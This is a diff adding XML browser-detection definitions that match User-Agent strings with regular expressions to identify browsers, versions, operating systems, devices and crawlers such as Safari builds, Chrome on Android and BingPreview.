+  <Identification Type="capability" Name="browser" Match="Fire|Hyper|Hypno|Jungle|Lightning|Moon|Power|Sea|Space|Sun|Super|Thunder|Turbo|Water|Web" />
+  <Identification Type="capability" Name="browser" NonMatch="Mozilla Firebird" />
+  <Capability Name="browser" Value="Firefox" />
+</Browser>
+<Browser Id="993" ParentId="912" Prority="" Name="AppleWebKitChrome2">
+  <Samples Name="User-Agent" Value="Mozilla/5.0 (Linux; U; Android 7.0; zh-CN; KNT-AL20 Build/HUAWEIKNT-AL20) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.108 UCBrowser/11.9.4.974 UWS/2.14.0.2 Mobile Safari/537.36 AliApp(TB/7.7.5) UCBS/2.11.1.1 TTID/227200@taobao_android_7.7.5 WindVane/8.3.0 1440X2427" />
+  <Identification Type="Header" Name="User-Agent" Match="Chrome/(?'version'\d+\.\d+(\.\d+)?)(\.\d+)" />
+  <Identification Type="Header" Name="User-Agent" NonMatch="OPR/\d+\.\d+(\.\d+)?" />
+  <Capture Type="Header" Name="User-Agent" Match="Android\s\d+\.\d+(\.\d+)?;\s(?'deviceID'[^)]*)" />
+  <Capability Name="browser" Value="Chrome" />
+  <Capability Name="version" Value="${version}" />
+  <Capability Name="mobileDeviceModel" Value="${deviceID}" />
+  <Child Id="1052" Name="EdgA" Type="GateWay" />
+  <Child Id="1154" Name="MiuiBrowser" Type="Browser" />
+  <Child Id="1131" Name="QQBrowser2" Type="Browser" />
+  <Child Id="1135" Name="UCBrowser" Type="Browser" />
+  <Child Id="1174" Name="YaBrowser2" Type="Browser" />
+</Browser>
+<Browser Id="994" ParentId="913" Prority="2" Name="AppleWebKitMobile">
+  <Identification Type="Header" Name="User-Agent" Match="^Mozilla/\d+\.\d+\s\((?'DeviceModel'[^;]*)" />
+  <Identification Type="Header" Name="User-Agent" Match="Mobile/(?'Model'\w*)" />
+  <Capability Name="browser" Value="Mobile Safari" />
+  <Capability Name="isMobileDevice" Value="True" />
+  <Capability Name="mobileDeviceManufacturer" Value="Apple" />
+  <Capability Name="Model" Value="${Model}" />
+  <Capability Name="mobileDeviceModel" Value="${DeviceModel} ${Model}" />
+</Browser>
+<Browser Id="995" ParentId="913" Prority="1" Name="AppleWebKitMobileiPhone">
+  <Identification Type="Header" Name="User-Agent" Match="iPhone" />
+  <Identification Type="Header" Name="User-Agent" Match="Mobile/(?'Model'\w*)" />
+  <Capability Name="mobileDeviceModel" Value="iPhone ${Model}" />
+  <Capability Name="isMobileDevice" Value="True" />
+  <Capability Name="mobileDeviceManufacturer" Value="Apple" />
+  <Capability Name="browser" Value="Mobile Safari" />
+</Browser>
+<Browser Id="996" ParentId="913" Prority="1" Name="AppleWebKitMobileiPod">
+  <Identification Type="Header" Name="User-Agent" Match="iPod" />
+  <Identification Type="Header" Name="User-Agent" Match="Mobile/(?'Model'\w*)" />
+  <Capability Name="mobileDeviceModel" Value="iPod ${Model}" />
+  <Capability Name="mobileDeviceManufacturer" Value="Apple" />
+  <Capability Name="mobileDeviceManufacturer" Value="Apple" />
+  <Capability Name="browser" Value="Mobile Safari" />
+</Browser>
+<Browser Id="997" ParentId="914" Prority="" Name="Safari0001">
+  <Identification Type="Header" Name="User-Agent" Match="AppleWebKit/85.7" />
+  <Identification Type="Header" Name="User-Agent" Match="Safari/85.5" />
+  <Capability Name="version" Value="1.0.0" />
+  <Capability Name="layoutEngine" Value="WebKit" />
+</Browser>
+<Browser Id="998" ParentId="914" Prority="" Name="Safari0002">
+  <Identification Type="Header" Name="User-Agent" Match="AppleWebKit/85.7" />
+  <Identification Type="Header" Name="User-Agent" Match="Safari/85.7" />
+  <Capability Name="version" Value="1.0.2" />
+  <Capability Name="layoutEngine" Value="WebKit" />
+</Browser>
+<Browser Id="999" ParentId="914" Prority="" Name="Safari0003">
+  <Identification Type="Header" Name="User-Agent" Match="AppleWebKit/85.8.2" />
+  <Identification Type="Header" Name="User-Agent" Match="Safari/85.8" />
+  <Capability Name="version" Value="1.0.3" />
+  <Capability Name="layoutEngine" Value="WebKit" />
+</Browser>
+<Browser Id="1000" ParentId="914" Prority="" Name="Safari0004">
+  <Identification Type="Header" Name="User-Agent" Match="AppleWebKit/85.8.2" />
+  <Identification Type="Header" Name="User-Agent" Match="Safari/85.8.1" />
+  <Capability Name="version" Value="1.0.3" />
+  <Capability Name="layoutEngine" Value="WebKit" />
+</Browser>
+<Browser Id="1001" ParentId="914" Prority="" Name="Safari0005">
+  <Identification Type="Header" Name="User-Agent" Match="AppleWebKit/85.8.5" />
+  <Identification Type="Header" Name="User-Agent" Match="Safari/85.8.1" />
+  <Capability Name="version" Value="1.0.3" />
+  <Capability Name="layoutEngine" Value="WebKit" />
+</Browser>
+<Browser Id="1002" ParentId="914" Prority="" Name="Safari0006">
+  <Identification Type="Header" Name="User-Agent" Match="AppleWebKit/100" />
+  <Identification Type="Header" Name="User-Agent" Match="Safari/100" />
+  <Capability Name="version" Value="1.1" />
+  <Capability Name="layoutEngine" Value="WebKit" />
+</Browser>
+<Browser Id="1003" ParentId="914" Prority="" Name="Safari0007">
+  <Identification Type="Header" Name="User-Agent" Match="AppleWebKit/100" />
+  <Identification Type="Header" Name="User-Agent" Match="Safari/100.1" />
+  <Capability Name="version" Value="1.1.1" />
+  <Capability Name="layoutEngine" Value="WebKit" />
+</Browser>
+<Browser Id="1004" ParentId="914" Prority="" Name="Safari0008">
+  <Identification Type="Header" Name="User-Agent" Match="AppleWebKit/125.2" />
+  <Identification Type="Header" Name="User-Agent" Match="Safari/125.7" />
+  <Capability Name="version" Value="1.1.1" />
+  <Capability Name="layoutEngine" Value="WebKit" />
+</Browser>
+<Browser Id="1005" ParentId="914" Prority="" Name="Safari0009">
+  <Identification Type="Header" Name="User-Agent" Match="AppleWebKit/125.2" />
+  <Identification Type="Header" Name="User-Agent" Match="Safari/125.8" />
+  <Capability Name="version" Value="1.2.2" />
+  <Capability Name="layoutEngine" Value="WebKit" />
+</Browser>
+<Browser Id="1006" ParentId="914" Prority="" Name="Safari0010">
+  <Identification Type="Header" Name="User-Agent" Match="AppleWebKit/125.4" />
+  <Identification Type="Header" Name="User-Agent" Match="Safari/125.9" />
+  <Capability Name="version" Value="1.2.3" />
+  <Capability Name="layoutEngine" Value="WebKit" />
+</Browser>
+<Browser Id="1007" ParentId="914" Prority="" Name="Safari0011">
+  <Identification Type="Header" Name="User-Agent" Match="AppleWebKit/125.5" />
+  <Identification Type="Header" Name="User-Agent" Match="Safari/125.9" />
+  <Capability Name="version" Value="1.2.3" />
+  <Capability Name="layoutEngine" Value="WebKit" />
+</Browser>
+<Browser Id="1008" ParentId="914" Prority="" Name="Safari0012">
+  <Identification Type="Header" Name="User-Agent" Match="AppleWebKit/125.5.5" />
+  <Identification Type="Header" Name="User-Agent" Match="Safari/125.11" />
+  <Capability Name="version" Value="1.2.4" />
+  <Capability Name="layoutEngine" Value="WebKit" />
+</Browser>
+<Browser Id="1009" ParentId="914" Prority="" Name="Safari0013">
+  <Identification Type="Header" Name="User-Agent" Match="AppleWebKit/125.5.5" />
+  <Identification Type="Header" Name="User-Agent" Match="Safari/125.12" />
+  <Capability Name="version" Value="1.2.4" />
+  <Capability Name="layoutEngine" Value="WebKit" />
+</Browser>
+<Browser Id="1010" ParentId="914" Prority="" Name="Safari0014">
+  <Identification Type="Header" Name="User-Agent" Match="AppleWebKit/125.5.6" />
+  <Identification Type="Header" Name="User-Agent" Match="Safari/125.12" />
+  <Capability Name="version" Value="1.2.4" />
+  <Capability Name="layoutEngine" Value="WebKit" />
+</Browser>
+<Browser Id="1011" ParentId="914" Prority="" Name="Safari0015">
+  <Identification Type="Header" Name="User-Agent" Match="AppleWebKit/125.5.7" />
+  <Identification Type="Header" Name="User-Agent" Match="Safari/125.12" />
+  <Capability Name="version" Value="1.2.4" />
+  <Capability Name="layoutEngine" Value="WebKit" />
+</Browser>
+<Browser Id="1012" ParentId="914" Prority="" Name="Safari0016">
+  <Identification Type="Header" Name="User-Agent" Match="AppleWebKit/312.1" />
+  <Identification Type="Header" Name="User-Agent" Match="Safari/312" />
+  <Capability Name="version" Value="1.3" />
+  <Capability Name="layoutEngine" Value="WebKit" />
+</Browser>
+<Browser Id="1013" ParentId="914" Prority="" Name="Safari0017">
+  <Identification Type="Header" Name="User-Agent" Match="AppleWebKit/312.1.1" />
+  <Identification Type="Header" Name="User-Agent" Match="Safari/312" />
+  <Capability Name="version" Value="1.3" />
+</Browser>
+<Browser Id="1014" ParentId="914" Prority="" Name="Safari0018">
+  <Identification Type="Header" Name="User-Agent" Match="AppleWebKit/312.5" />
+  <Identification Type="Header" Name="User-Agent" Match="Safari/312.3" />
+  <Capability Name="version" Value="1.3.1" />
+</Browser>
+<Browser Id="1015" ParentId="914" Prority="" Name="Safari0019">
+  <Identification Type="Header" Name="User-Agent" Match="AppleWebKit/312.5.1" />
+  <Identification Type="Header" Name="User-Agent" Match="Safari/312.3.1" />
+  <Capability Name="version" Value="1.3.1" />
+  <Capability Name="layoutEngine" Value="WebKit" />
+</Browser>
+<Browser Id="1016" ParentId="914" Prority="" Name="Safari0020">
+  <Identification Type="Header" Name="User-Agent" Match="AppleWebKit/312.8" />
+  <Identification Type="Header" Name="User-Agent" Match="Safari/312.5" />
+  <Capability Name="version" Value="1.3.2" />
+  <Capability Name="layoutEngine" Value="WebKit" />
+</Browser>
+<Browser Id="1017" ParentId="914" Prority="" Name="Safari0021">
+  <Identification Type="Header" Name="User-Agent" Match="AppleWebKit/312.8" />
+  <Identification Type="Header" Name="User-Agent" Match="Safari/312.6" />
+  <Capability Name="version" Value="1.3.2" />
+  <Capability Name="layoutEngine" Value="WebKit" />
+</Browser>
+<Browser Id="1018" ParentId="914" Prority="" Name="Safari0022">
+  <Identification Type="Header" Name="User-Agent" Match="AppleWebKit/312.8.1" />
+  <Identification Type="Header" Name="User-Agent" Match="Safari/312.6" />
+  <Capability Name="version" Value="1.3.2" />
+  <Capability Name="layoutEngine" Value="WebKit" />
+</Browser>
+<Browser Id="1019" ParentId="914" Prority="" Name="Safari0023">
+  <Identification Type="Header" Name="User-Agent" Match="AppleWebKit/412" />
+  <Identification Type="Header" Name="User-Agent" Match="Safari/412" />
+  <Capability Name="version" Value="2.0" />
+  <Capability Name="layoutEngine" Value="WebKit" />
+</Browser>
+<Browser Id="1020" ParentId="914" Prority="" Name="Safari0026">
+  <Identification Type="Header" Name="User-Agent" Match="AppleWebKit/412.7" />
+  <Identification Type="Header" Name="User-Agent" Match="Safari/412.5" />
+  <Capability Name="version" Value="2.0.1" />
+  <Capability Name="layoutEngine" Value="WebKit" />
+</Browser>
+<Browser Id="1021" ParentId="914" Prority="" Name="Safari0027">
+  <Identification Type="Header" Name="User-Agent" Match="AppleWebKit/416.11" />
+  <Identification Type="Header" Name="User-Agent" Match="Safari/416.12" />
+  <Capability Name="version" Value="2.0.2" />
+  <Capability Name="layoutEngine" Value="WebKit" />
+</Browser>
+<Browser Id="1022" ParentId="914" Prority="" Name="Safari0028">
+  <Identification Type="Header" Name="User-Agent" Match="AppleWebKit/416.12" />
+  <Identification Type="Header" Name="User-Agent" Match="Safari/416.13" />
+  <Capability Name="version" Value="2.0.2" />
+  <Capability Name="layoutEngine" Value="WebKit" />
+</Browser>
+<Browser Id="1023" ParentId="914" Prority="" Name="Safari0029">
+  <Identification Type="Header" Name="User-Agent" Match="AppleWebKit/417.9" />
+  <Identification Type="Header" Name="User-Agent" Match="Safari/417.8" />
+  <Capability Name="version" Value="2.0.3" />
+  <Capability Name="layoutEngine" Value="WebKit" />
+</Browser>
+<Browser Id="1024" ParentId="914" Prority="" Name="Safari0030">
+  <Identification Type="Header" Name="User-Agent" Match="AppleWebKit/417" />
+  <Identification Type="Header" Name="User-Agent" Match="Safari/417" />
+  <Capability Name="version" Value="2.0.3" />
+  <Capability Name="layoutEngine" Value="WebKit" />
+</Browser>
+<Browser Id="1025" ParentId="914" Prority="" Name="Safari0031">
+  <Identification Type="Header" Name="User-Agent" Match="AppleWebKit/418" />
+  <Identification Type="Header" Name="User-Agent" Match="Safari/417" />
+  <Capability Name="version" Value="2.0.3" />
+  <Capability Name="layoutEngine" Value="WebKit" />
+</Browser>
+<Browser Id="1026" ParentId="914" Prority="" Name="Safari0033">
+  <Identification Type="Header" Name="User-Agent" Match="AppleWebKit/418" />
+  <Identification Type="Header" Name="User-Agent" Match="Safari/419.3" />
+  <Capability Name="version" Value="2.0.4" />
+  <Capability Name="layoutEngine" Value="WebKit" />
+</Browser>
+<Browser Id="1027" ParentId="914" Prority="" Name="Safari0036">
+  <Identification Type="Header" Name="User-Agent" Match="AppleWebKit/419" />
+  <Identification Type="Header" Name="User-Agent" Match="Safari/419.3" />
+  <Capability Name="version" Value="2.0.4" />
+  <Capability Name="layoutEngine" Value="WebKit" />
+</Browser>
+<Browser Id="1028" ParentId="914" Prority="" Name="Safari0039">
+  <Identification Type="Header" Name="User-Agent" Match="AppleWebKit/420.1" />
+  <Identification Type="Header" Name="User-Agent" Match="Safari/419.3" />
+  <Capability Name="version" Value="3.0.0" />
+  <Capability Name="layoutEngine" Value="WebKit" />
+</Browser>
+<Browser Id="1029" ParentId="914" Prority="" Name="Safari0040">
+  <Identification Type="Header" Name="User-Agent" Match="Safari/(?'SafariBuild'\d+(\.\d+)?)" />
+  <Identification Type="Header" Name="User-Agent" Match="\(KHTML,\slike\sGecko\)\s(?'browser'[^/\d]*)/(?'version'\d+(\.\d+(\.\d+)?)?)" />
+  <Capability Name="browser" Value="${browser}" />
+  <Capability Name="version" Value="${version}" />
+  <Capability Name="layoutEngine" Value="WebKit" />
+  <Capability Name="layoutEngineVersion" Value="${version}" />
+  <Child Id="1058" Name="ChromeMobile" Type="Browser" />
+  <Child Id="1053" Name="Chromium" Type="Browser" />
+  <Child Id="1125" Name="Edg" Type="Browser" />
+  <Child Id="1062" Name="GSA" Type="Browser" />
+  <Child Id="1056" Name="Iron" Type="Browser" />
+  <Child Id="1055" Name="Maxthon" Type="Browser" />
+  <Child Id="1127" Name="Opera Chrome" Type="Browser" />
+  <Child Id="1059" Name="PhantomJS" Type="Browser" />
+  <Child Id="1130" Name="QQBrowser" Type="Browser" />
+  <Child Id="1061" Name="Safari7" Type="Browser" />
+  <Child Id="1057" Name="SafariBetaPublic" Type="Browser" />
+  <Child Id="1060" Name="YaBrowser" Type="Browser" />
+  <Child Id="1054" Name="iCab4_7" Type="Browser" />
+</Browser>
+<Browser Id="1030" ParentId="914" Prority="" Name="NintendoBrowser">
+  <Identification Type="Header" Name="User-Agent" Match="NintendoBrowser/(?'version'\d+\.\d+(\.\d+)?)" />
+  <Capability Name="browser" Value="NintendoBrowser" />
+  <Capability Name="version" Value="${version}" />
+</Browser>
+<Browser Id="1031" ParentId="914" Prority="" Name="BingPreview">
+  <Identification Type="Header" Name="User-Agent" Match="BingPreview/" />
+  <Capture Type="Header" Name="User-Agent" Match="BingPreview/(?'version'(?'major'\d+)\.(?'minor'\d+(\.\d+)?))" />
+  <Capability Name="browser" Value="BingPreview" />
+  <Capability Name="version" Value="${version}" />
+  <Capability Name="crawler" Value="True" />
+</Browser>
+<Browser Id="1032" ParentId="915" Prority="" Name="AppleWebKitSymbianOSNokia">
+  <Identification Type="Header" Name="User-Agent" Match="^Mozilla/5\.0\s\(SymbianOS/\d\.\d;\sU;\sSeries\d\d/\d\.\d\sNokia(?'Model'[^/]*)/(?'version'\d+\.\d+(\.\d+)?)" />
+  <Capability Name="browser" Value="Nokia" />
+  <Capability Name="mobileDeviceManufacturer" Value="Nokia" />
+  <Capability Name="mobileDeviceModel" Value="Nokia ${Model}" />
+  <Capability Name="version" Value="${version}" />
+</Browser>
+<Browser Id="1033" ParentId="916" Prority="" Name="OmniWebv496">
+  <Identification Type="Header" Name="User-Agent" Match="OmniWeb/v496" />
+  <Capability Name="version" Value="4.5" />
+</Browser>
+<Browser Id="1034" ParentId="916" Prority="" Name="OmniWebv558">
+  <Identification Type="Header" Name="User-Agent" Match="OmniWeb/v558" />
+  <Capability Name="version" Value="5.0" />
+</Browser>
+<Browser Id="1035" ParentId="916" Prority="" Name="OmniWebv563">
+  <Identification Type="Header" Name="User-Agent" Match="OmniWeb/v563" />
+  <Capability Name="version" Value="5.1" />
+</Browser>
+<Browser Id="1036" ParentId="916" Prority="" Name="OmniWebv607">
+  <Identification Type="Header" Name="User-Agent" Match="OmniWeb/v607" />
+  <Capability Name="version" Value="5.5" />
+</Browser>
+<Browser Id="1037" ParentId="916" Prority="" Name="OmniWebv613">
+  <Identification Type="Header" Name="User-Agent" Match="OmniWeb/v613" />
+  <Capability Name="version" Value="5.6" />
+</Browser>
+<Browser Id="1038" ParentId="917" Prority="" Name="GoogleWebPreview">
+  <Identification Type="Header" Name="User-Agent" Match="Google Web Preview" />
+  <Capability Name="crawler" Value="True" />
+  <Capability Name="browser" Value="Google Web Preview" />
+  <Capability Name="version" Value="0.0" />
+</Browser>
+<Browser Id="1039" ParentId="917" Prority="" Name="GooglePageSpeedInsights">
+  <Identification Type="Header" Name="User-Agent" Match="Google Page Speed Insights" />
+  <Capability Name="browser" Value="Google Page Speed Insights" />
+  <Capability Name="version" Value="0" />
+  <Capability Name="crawler" Value="true" />
+  <Capability Name="isMobileDevice" Value="false" />
+</Browser>
+<Browser Id="1040" ParentId="925" Prority="" Name="IEMobile3">
+  <Identification Type="Header" Name="User-Agent" Match="IEMobile.(?'version'\d+(\.\d+?)\w*)" />
+  <Capture Type="Header" Name="User-Agent" Match="MSIE (?'msieMajorVersion'\d+)" />
+  <Capability Name="browser" Value="IEMobile" />
+  <Capability Name="isMobileDevice" Value="true" />
+  <Capability Name="version" Value="${version}" />
+</Browser>
+<Browser Id="1041" ParentId="927" Prority="" Name="WINCE4">
+  <Identification Type="Header" Name="User-Agent" Match="^Mozilla/4\.0\s\(compatible;\s[^\s]*\s\d+\.\d+([^;]*)?;\D*\sWindows\sCE(;\s\D\w*)?(;\s\d+x\d+)?" />
+  <Capture Type="Header" Name="User-Agent" Match="IEMobile\s(?'version'(?'major'\d+)\.(?'minor'\d+(\.\d+)?))" />
+  <Capture Type="Header" Name="User-Agent" Match="MSIE (?'version'(?'major'\d+)\.(?'minor'\d+(\.\d+)?))" />
+  <Capability Name="browser" Value="IEMobile" />
+  <Capability Name="version" Value="${version}" />
+  <Child Id="1063" Name="wince4Model" Type="Browser" />
+</Browser>
+<Browser Id="1042" ParentId="927" Prority="" Name="MSIENokia">
+  <Identification Type="Header" Name="User-Agent" Match=";\sSeries\d\d/\d\.\d\sNokia(?'Model'\d+)/\d+\.\d+" />
+  <Capability Name="mobileDeviceManufacturer" Value="Nokia" />
+  <Capability Name="mobileDeviceModel" Value="Nokia ${Model}" />
+  <Capability Name="browser" Value="Unknown" />
+  <Capability Name="crawler" Value="False" />
+  <Capability Name="version" Value="0.0" />
+  <Capability Name="isMobileDevice" Value="True" />
+  <Child Id="1064" Name="N9500r100" Type="Browser" />
+</Browser>
+<Browser Id="1043" ParentId="927" Prority="" Name="IE8Compatible">
+  <Identification Type="capability" Name="majorversion" Match="6|7" />
+  <Identification Type="Header" Name="User-Agent" Match="Trident/4\.0" />
+  <Capability Name="version" Value="8.0" />
+  <Capability Name="layoutEngineVersion" Value="4.0" />
+  <Capability Name="layoutEngine" Value="Trident" />
+</Browser>
+<Browser Id="1044" ParentId="927" Prority="" Name="IE9Compatible">
+  <Identification Type="Header" Name="User-Agent" Match="Trident/5\.0" />
+  <Identification Type="capability" Name="majorversion" NonMatch="9" />
+  <Capability Name="browser" Value="Microsoft Internet Explorer" />
+  <Capability Name="version" Value="9.0" />
+  <Capability Name="layoutEngineVersion" Value="5.0" />
+  <Capability Name="layoutEngine" Value="Trident" />
+</Browser>
+<Browser Id="1045" ParentId="927" Prority="" Name="IE10Compatible">
+  <Identification Type="Header" Name="User-Agent" Match="Trident/6\.0" />
+  <Identification Type="capability" Name="majorversion" NonMatch="10" />
+  <Capability Name="browser" Value="Microsoft Internet Explorer" />
+  <Capability Name="version" Value="10.0" />
+  <Capability Name="layoutEngineVersion" Value="6.0" />
+  <Capability Name="layoutEngine" Value="Trident" />
+</Browser>
+<Browser Id="1046" ParentId="927" Prority="" Name="IE11Compatible">
+  <Identification Type="Header" Name="User-Agent" Match="Trident/7\.0" />
+  <Identification Type="capability" Name="majorversion" NonMatch="11" />
+  <Capability Name="browser" Value="Microsoft Internet Explorer" />
+  <Capability Name="version" Value="11.0" />
+  <Capability Name="layoutEngineVersion" Value="7.0" />
+  <Capability Name="layoutEngine" Value="Trident" />
+</Browser>
+<Browser Id="1047" ParentId="929" Prority="" Name="WINCE2">
+  <Identification Type="Header" Name="User-Agent" Match="^Mozilla/2\.0\s\(compatible;\s[^\s]*\s\d+\.\d+([^;]*)?;\D*\sWindows\sCE(;\s\D\w*)?(;\s\d+x\d+)?" />
+  <Capability Name="browser" Value="IEMobile" />
+</Browser>
+<Browser Id="1048" ParentId="950" Prority="" Name="W3Cchecklink">
+  <Identification Type="Header" Name="User-Agent" Match="W3C-checklink/(?'version'\d+\.\d+(\.\d+)?)" />
+  <Capability Name="browser" Value="W3C-checklink" />
+  <Capability Name="version" Value="${version}" />
+</Browser>
+<Browser Id="1049" ParentId="957" Prority="" Name="Slurp3">
+  <Identification Type="Header" Name="User-Agent" Match="Yahoo!\sSlurp/(?'version'\d+\.\d+(\.\d+)?)" />
+  <Capability Name="version" Value="${version}" />
+</Browser>
+<Browser Id="1050" ParentId="957" Prority="" Name="SlurpChina">
+  <Identification Type="Header" Name="User-Agent" Match="Yahoo! Slurp China" />
+  <Capability Name="browser" Value="Yahoo Slurp China" />
+  <Capability Name="version" Value="0.0" />
+</Browser>
+<Gateway Id="1052" ParentId="993" Prority="" Name="EdgA">
+  <Identification Type="Header" Name="User-Agent" Match="EdgA/(?'version'\d+\.\d+(\.\d+)?)" />
+  <Capability Name="browser" Value="Microsoft Edge" />
+  <Capability Name="version" Value="${version}" />
+</Gateway>
+<Browser Id="1053" ParentId="1029" Prority="" Name="Chromium">
+  <Identification Type="Header" Name="User-Agent" Match="Chromium/(?'version'\d+\.\d+(\.\d+)?)" />
+  <Capability Name="browser" Value="Chromium" />
+  <Capability Name="version" Value="${version}" />
+</Browser>
+<Browser Id="1054" ParentId="1029" Prority="" Name="iCab4_7">
+  <Identification Type="Header" Name="User-Agent" Match="iCab/(?'version'\d+\.\d+(\.\d+)?)\sSafari" />
+  <Capability Name="browser" Value="iCab" />
+  <Capability Name="version" Value="${version}" />
+</Browser>
+<Browser Id="1055" ParentId="1029" Prority="" Name="Maxthon">
+  <Identification Type="Header" Name="User-Agent" Match="Maxthon/(?'version'\d+\.\d+(\.\d+)?)" />
+  <Capability Name="browser" Value="Maxthon" />
+  <Capability Name="version" Value="${version}" />
+</Browser>
+<Browser Id="1056" ParentId="1029" Prority="" Name="Iron">
+  <Identification Type="Header" Name="User-Agent" Match="Iron/(?'version'\d+\.\d+(\.\d+)?)" />
+  <Capability Name="browser" Value="Iron" />
+  <Capability Name="version" Value="${version}" />
+</Browser>
+<Browser Id="1057" ParentId="1029" Prority="" Name="SafariBetaPublic">
+  <Identification Type="Header" Name="User-Agent" Match="Version/(?'version'\d+\.\d+(\.\d+)?)\sPublic\sBeta\sSafari/|Version/(?'version'\d+)\sPublic\sBeta\sSafari/" />
+  <Capability Name="browser" Value="Safari" />
+  <Capability Name="version" Value="${version}" />
+</Browser>
+<Browser Id="1058" ParentId="1029" Prority="" Name="ChromeMobile">
+  <Identification Type="Header" Name="User-Agent" Match="CriOS/((?'version'\d+\.\d+(\.\d+)?))" />
+  <Capability Name="browser" Value="Chrome Mobile" />
+  <Capability Name="version" Value="${version}" />
+</Browser>
+<Browser Id="1059" ParentId="1029" Prority="" Name="PhantomJS">
+  <Identification Type="Header" Name="User-Agent" Match="Phantom(JS|js)/(?'version'\d+\.\d+(\.\d+)?)" />
+  <Capability Name="crawler" Value="true" />
+  <Capability Name="browser" Value="PhantomJS" />
+  <Capability Name="version" Value="${version}" />
+</Browser>
+<Browser Id="1060" ParentId="1029" Prority="" Name="YaBrowser">
+  <Identification Type="Header" Name="User-Agent" Match="YaBrowser/(?'version'\d+\.\d+(\.\d+)?)" />
+  <Capability Name="browser" Value="YaBrowser" />
+  <Capability Name="version" Value="${version}" />
+</Browser>
+<Browser Id="1061" ParentId="1029" Prority="" Name="Safari7">
+  <Identification Type="Header" Name="User-Agent" Match="Mobile/11D167\sSafari/9537.53" />
+  <Capability Name="browser" Value="Safari" />
+  <Capability Name="version" Value="7.0.0" />
+  <Capability Name="isMobileDevice" Value="true" />
+</Browser>
+<Browser Id="1062" ParentId="1029" Prority="" Name="GSA">
+  <Identification Type="Header" Name="User-Agent" Match="GSA/(?'version'\d+\.\d+(\.\d+)?)" />
+  <Capability Name="browser" Value="Google Search application" />
+  <Capability Name="version" Value="${version}" />
+  <Capability Name="isMobileDevice" Value="true" />
+</Browser>
+<Browser Id="1063" ParentId="1041" Prority="" Name="wince4Model">
+  <Identification Type="Header" Name="User-Agent" Match="(?'deviceID'HTC[_-][^/|^\s]*)|(?'deviceID'Qtek[_-][^/|^\s]*)|(?'deviceID'Palm[^/|^\s]*)" />
+  <Capability Name="mobileDeviceModel" Value="${deviceID}" />
+</Browser>
+<Browser Id="1064" ParentId="1042" Prority="" Name="N9500r100">
+  <Identification Type="Header" Name="User-Agent" Match="Nokia9500" />
+  <Capability Name="browser" Value="Opera" />
+  <Capability Name="version" Value="6.0" />
+</Browser>
+<Gateway Id="1065" ParentId="799" Prority="" Name="OceanOS">
+  <Identification Type="Header" Name="User-Agent" Match="." />
+  <Identification Type="Header" Name="User-Agent" NonMatch="(?i-s:crawler|bot|spider|larbin|search|indexer|archiver|heritrix|HttpClient|Nutch|libwww|Ask\sJeeves|thumbnails|CerberianDrtrs|Cerberian Drtrs|Bluecoat\sDRTR|Slurp|HTTrack|Indy\sLibrary|picmole|research\sproject|WebCapture|ScanAlert|Xenu|Sleuth|Mozlila)" />
+  <Capability Name="OS" Value="Unknown" />
+  <Child Id="1080" Name="AIX" Type="Browser" />
+  <Child Id="1075" Name="AmigaOS" Type="Browser" />
+  <Child Id="1087" Name="AndroidGeneric" Type="Browser" />
+  <Child Id="1071" Name="BSD" Type="Browser" />
+  <Child Id="1078" Name="BeOS" Type="Browser" />
+  <Child Id="1161" Name="ChromeOS" Type="Browser" />
+  <Child Id="1083" Name="Commodore" Type="Browser" />
+  <Child Id="1082" Name="Dreamcast" Type="Browser" />
+  <Child Id="1088" Name="FireFoxOS" Type="Browser" />
+  <Child Id="1079" Name="HPUX" Type="Browser" />
+  <Child Id="1074" Name="IRIX" Type="Browser" />
+  <Child Id="1070" Name="Linux" Type="Browser" />
+  <Child Id="1068" Name="MAC" Type="Browser" />
+  <Child Id="1164" Name="Mandriva" Type="GateWay" />
+  <Child Id="1085" Name="Nintendo" Type="Browser" />
+  <Child Id="1073" Name="OS2" Type="Browser" />
+  <Child Id="1077" Name="OSF1alpha" Type="Browser" />
+  <Child Id="1067" Name="OSWebTV" Type="Browser" />
+  <Child Id="1081" Name="OpenVMS" Type="Browser" />
+  <Child Id="1086" Name="OperaMiniOS" Type="Browser" />
+  <Child Id="1084" Name="PalmOS" Type="Browser" />
+  <Child Id="1166" Name="RIMOS" Type="GateWay" />
+  <Child Id="1069" Name="RedHat" Type="Browser" />
+  <Child Id="1072" Name="SunOS" Type="Browser" />
+  <Child Id="1076" Name="SymbianOS" Type="Browser" />
+  <Child Id="1066" Name="Windows" Type="Browser" />
+</Gateway>
+<Browser Id="1066" ParentId="1065" Prority="" Name="Windows">
+  <Identification Type="Header" Name="User-Agent" NonMatch="PalmOS|PalmSource" />
+  <Identification Type="Header" Name="User-Agent" Match="Windows|Win|16bit|Win16" />
+  <Child Id="1123" Name="Windows 10" Type="Browser" />
+  <Child Id="1124" Name="Windows 11" Type="Browser" />
+  <Child Id="1091" Name="Windows2000" Type="Browser" />
+  <Child Id="1104" Name="Windows311" Type="Browser" />
+  <Child Id="1095" Name="Windows52" Type="Browser" />
+  <Child Id="1089" Name="Windows55" Type="Browser" />
+  <Child Id="1096" Name="Windows60" Type="Browser" />
+  <Child Id="1098" Name="Windows61" Type="Browser" />
+  <Child Id="1099" Name="Windows62" Type="Browser" />
+  <Child Id="1100" Name="Windows63" Type="Browser" />
+  <Child Id="1101" Name="Windows7" Type="Browser" />
+  <Child Id="1094" Name="Windows95" Type="Browser" />
+  <Child Id="1093" Name="Windows98" Type="Browser" />
+  <Child Id="1105" Name="WindowsCE" Type="Browser" />
+  <Child Id="1092" Name="WindowsME" Type="Browser" />
+  <Child Id="1103" Name="WindowsNT351" Type="Browser" />
+  <Child Id="1102" Name="WindowsNT4" Type="Browser" />
+  <Child Id="1097" Name="WindowsVista" Type="Browser" />
+  <Child Id="1090" Name="WindowsXP" Type="Browser" />
+  <Child Id="1106" Name="win64" Type="GateWay" />
+</Browser>
+<Browser Id="1067" ParentId="1065" Prority="" Name="OSWebTV">
+  <Identification Type="Header" Name="User-Agent" Match="WebTV" />
+  <Capability Name="OS" Value="Microsoft WebTV" />
+</Browser>
+<Browser Id="1068" ParentId="1065" Prority="" Name="MAC">
+  <Identification Type="Header" Name="User-Agent" Match="Mac|PPC" />
+  <Child Id="1108" Name="Macintosh68K" Type="Browser" />
+  <Child Id="1109" Name="MacintoshDarwin" Type="Browser" />
+  <Child Id="1107" Name="MacintoshOSX" Type="Browser" />
+  <Child Id="1110" Name="MacintoshPPC" Type="Browser" />
+</Browser>
+<Browser Id="1069" ParentId="1065" Prority="" Name="RedHat">
+  <Identification Type="Header" Name="User-Agent" Match="(?i-s:redhat)" />
+  <Capability Name="OS" Value="Linux" />
